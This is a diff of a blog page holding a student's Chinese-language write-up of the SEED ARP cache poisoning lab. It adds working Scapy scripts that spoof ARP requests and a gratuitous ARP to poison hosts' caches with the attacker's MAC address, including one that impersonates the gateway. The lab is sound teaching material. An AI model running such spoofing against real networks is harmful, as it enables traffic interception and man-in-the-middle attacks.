@@ -123,11 +123,26 @@
 <p>在该实验中，我们将需要3台VM，即A,B和M。我们想要攻击A的ARP缓存，以便在A的ARP缓存中实现以下结果。</p>
 <p><code>B’s IP address --&gt; M’s MAC address</code></p>
 <p>There are many ways to conduct（举办，进行） ARP cache poisoning attack. Students need to try the following three methods, and report whether each method works or not.</p>
-<p>进行ARP缓存中毒攻击的方法有很多。学生需要尝试以下三种方式，并且记录每种方式是否可行。</p>
+<p>进行ARP缓存中毒攻击的方法有很多。学生需要尝试以下三种方式，并且记录每种方式是否可行。（注：我先做的任务B，后再做的任务A，C。）</p>
 <ul>
 <li><p><strong>Task 1A (using ARP request).</strong> On host M, construct an ARP request packet and send to host A. Check whether M’s MAC address is mapped to B’s IP address in A’s ARP cache.</p>
 <p><strong>任务1A（使用ARP请求）</strong>在主机M，构建一个ARP请求包并发送给主机A。检测是否在A的ARP缓存表中有B的IP地址映射了M的MAC地址。</p>
 <blockquote>
+<ol>
+<li>在zhangshuaiyang2/ARP-Cache-Poisoning文件夹下，创建了文件task1B.py</li>
+<li>文件task1B.py 中的python代码如下</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">#spoof A,so we need A'mac</span></span><br><span class="line">&gt; E = Ether(dst=<span class="string">"08:00:27:04:d9:58"</span>)</span><br><span class="line">&gt; <span class="comment">#src is B,dst is A,but now i'm in M</span></span><br><span class="line">&gt; <span class="comment">#op中的1表示who-has，2表示is-at</span></span><br><span class="line">&gt; A = ARP(op = <span class="number">1</span>,psrc=<span class="string">"10.0.2.5"</span>,pdst=<span class="string">"10.0.2.15"</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; pkt = E/A</span><br><span class="line">&gt; sendp(pkt)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<ol start="3">
+<li><p>在主机A中查看ARP缓存表，第一条命令是没有执行文件显现出来的情况。第二条命令是执行命令后显示出来的情况，可以看到，在A的arp表中已经存在了主机B的ip对应于主机M的mac地址</p>
+<img src="/2019/10/07/ARP缓存中毒攻击实验/5.jpg" title="This is an test image">
+</li>
+<li><p>在执行文件前，我们就使用wireshark开启了抓包。在wireshark中也可以看到结果。A收到了主机M发出的arp广播请求，并且还给主机M一个回应</p>
+<img src="/2019/10/07/ARP缓存中毒攻击实验/6.jpg" title="This is an test image">
+</li>
+</ol>
 </blockquote>
 <br>
 </li>
@@ -135,7 +150,7 @@
 <p><strong>任务1B（使用ARP回应）</strong>在主机M，构建一个ARP回应包并发送到主机A。检测是否在A的ARP缓存表中有B的IP地址映射了M的MAC地址。</p>
 <blockquote>
 <ol>
-<li><p>我在主机M（即linux2）上，创建了zhangshuaiyang3文件夹，然后再在该文件夹下创建了ARP-Cache-Poisoning文件夹。在ARP-Cache-Poisoning文件夹下，创建了文件task1A.py </p>
+<li><p>我在主机M（即linux2）上，创建了zhangshuaiyang2文件夹，然后再在该文件夹下创建了ARP-Cache-Poisoning文件夹。在ARP-Cache-Poisoning文件夹下，创建了文件task1A.py </p>
 </li>
 <li><p>文件task1A.py 中的python代码如下</p>
 </li>
@@ -173,8 +188,29 @@
 <ol>
 <li>源IP地址和目标IP地址相同，它们是发出免费ARP的主机的IP地址。</li>
 <li>在ARP头部和以太网头部中的目的MAC地址都是广播地址（ff:ff:ff:ff:ff:ff）</li>
-<li>理论来说不会收到回应</li>
+<li>理论来说不会收到回应（注：如果假冒的主机是存在的，那么还是会有回应）</li>
 </ol>
+<blockquote>
+<ol>
+<li><p>测试前可以清除主机A和B的arp缓存表，<code>sudo ip neigh flush dev enp0s3</code>，不清除也没事。正好我们可以看下在主机A中，是不是arp中的B与网关的mac地址都成为主机M的了</p>
+</li>
+<li><p>在主机M上编写程序文件。文件task1C.py 中的python代码如下。由于是欺骗所有人，所以我就没有设置假冒B了，因为也要欺骗B。这里我假冒的是网关IP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;    <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt;    <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;    </span><br><span class="line">&gt;    <span class="comment">#spoof all,so we need broad'mac</span></span><br><span class="line">&gt;    E = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span><br><span class="line">&gt;    <span class="comment">#src is gateway,dst is gateway,but now i'm in M</span></span><br><span class="line">&gt;    A = ARP(op = <span class="number">1</span>,psrc=<span class="string">"10.0.2.1"</span>,pdst=<span class="string">"10.0.2.1"</span>)</span><br><span class="line">&gt;    </span><br><span class="line">&gt;    pkt = E/A</span><br><span class="line">&gt;    sendp(pkt)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="3">
+<li><p>在主机A和B中，查看arp缓存表。可以看到主机A中，网关和B的IP所对应的mac都变成主机M的mac地址了。而在主机B中，arp中的网关IP对应的也是主机M的mac地址。</p>
+<img src="/2019/10/07/ARP缓存中毒攻击实验/7.jpg" title="This is an test image">
+</li>
+<li><p>同时做上述操作前，我还在主机A上重新利用wireshark抓包，结果如下。可以发现第一个包是一个无故ARP包，由主机M发出。同时由于冒充的是网关，所以网关真实存在，则得到了一个回应，即第二个包。所以在主机M中，网关的mac依旧是没有发生变化的。</p>
+<img src="/2019/10/07/ARP缓存中毒攻击实验/8.png" title="This is an test image">
+
+<img src="/2019/10/07/ARP缓存中毒攻击实验/9.png" title="This is an test image">
+</li>
+</ol>
+</blockquote>
 </li>
 </ul>
 <br>
